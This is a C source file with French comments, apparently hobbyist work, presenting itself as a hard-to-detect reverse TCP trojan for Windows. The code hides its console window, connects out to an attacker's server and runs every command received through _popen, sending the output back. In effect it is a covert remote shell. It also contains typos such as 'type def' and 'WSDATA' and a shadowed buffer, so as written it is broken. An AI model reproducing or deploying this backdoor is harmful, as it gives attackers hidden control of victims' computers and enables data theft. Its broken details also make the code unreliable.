//
// server.c
//
// Created by Cécile Bourgeois on 08/11/2020.
//
// Trojan reverse TCP difficilement détectable en langage C
// Partie serveur en C
// Partie cliente en python
//

// --- REMARQUE IMPORTANTE --- //
// Pour éviter les buffer overflow, on devrait préferer le c++ et std::string
// Ici la mémoire est mal gérée

type def int socklen_t;
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h> // utilisation de socket
#define _WIN32_WINNT 0x0500
#include <windows.h>

// Informations du serveur
#define PORT 666
#define SERVER ... // adresse IP du serveur / connexion du type reverse
// Donc c'est le client qui se connecte au serveur
// Le client a besoin de connaître l'adresse du serveur

/*
Les problèmes que l'on pourrait régler :
-> chaque commande est exécutée dans un process différent
on n'a donc pas de continuité dans les commandes (déplacements de
répertoires... etc)
 Contournement : envoyer plusieurs commandes dans un fichier, puis exécuter le script
*/
int main(void)
{
    // On cache la console au lancement
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_MINIMIZE);
    ShowWindow(hWnd, SW_HIDE);

    // Création de l'objet socket
    WSDATA WSAData; // La structure WSADATA contient des informations sur l'implémentation de Windows Sockets
    int erreur = WSAStartup(MAKEWORD(2, 2), &WSAData); // La fonction WSAStartup lance l'utilisation de la DLL Winsock par un processus
    
    SOCKET sock;
    SOCKADDR_IN sin;
    /*
    typedef struct sockaddr_in {
      short          sin_family;
      u_short        sin_port;
      struct in_addr sin_addr;
      char           sin_zero[8];
    } SOCKADDR_IN, *PSOCKADDR_IN, *LPSOCKADDR_IN;
    
    */
    char buffer[999] = ""; // pas terrible pour les dépassements

    if (!erreur)
    {
        // Création de la socket
        sock = socket(AF_INET, SOCK_STREAM, 0);
        // SOCK_STREAM : Support de dialogue garantissant l'intégrité, fournissant un flux de données binaires, et intégrant un mécanisme pour les transmissions de données hors-bande
        
        // Configuration de la connexion
        sin.sin_addr.s_addr = inet_addr(SERVER);
        sin.sin_family = AF_INET; // TCP/IP
        sin.sin_port = htons(PORT);
        
        // Si l'on a réussi à se connecter
        if (connect(sock, (SOCKADDR*)& sin, sizeof(sin)) != SOCKET_ERROR)
        {
            // Tant que la socket est active si on reçoit une requête
            while (recv(sock, buffer, 999, 0) != SOCKET_ERROR)
            // int recv(int s, void *buf, int len, unsigned int flags);
            // recv est à utiliser pour le mode connecté. Elle reçoit sur le socket s, des données qu'elle stockera à l'endroit pointé par buf, pour une taille maximale de len octets
            {
                FILE* fp;
                char path[999];
                
                // On exécute la commande contenue dans le buffer
                // On utilise _popen plutôt que system afin de récupérer l'output
                fp = _popen(buffer, "r"); // pour lancer un process avec la chaine de caractères envoyée par le serveur pour récuper le stdout

                // On réinitialise le buffer pour renvoyer le résultat
                char buffer[9999] = "";
                while (fgets(path, sizeof(path) - 1, fp) != NULL) // fgets pour récupérer le résultat de retour
                {
                    // On concatène chaque ligne de retour
                    strcat(buffer, path);
                }
                
                // On renvoit le résultat
                // send (int  sockfd , const void * buf , size_t  len , int  flags);
                send(sock, buffer, strlen(buffer)+1, 0);
                // L' appel send () ne peut être utilisé que lorsque le socket est dans un état connecté (afin que le destinataire prévu soit connu)
                // Elle envoie sur le socket sock, les données pointées par buffer

                // On ferme le process
                _pclose(fp);
            }
        }
        
        // fermeture de la connexion
        closesocket(sock);
        WSACleanup(); // La fonction WSACleanup met fin à l'utilisation de la DLL Winsock 2 (Ws2_32.dll)
        // La valeur de retour est zéro si l'opération a réussi. Sinon, la valeur SOCKET_ERROR est renvoyée et un numéro d'erreur spécifique peut être récupéré en appelant WSAGetLastError


    }
    return 0;
}
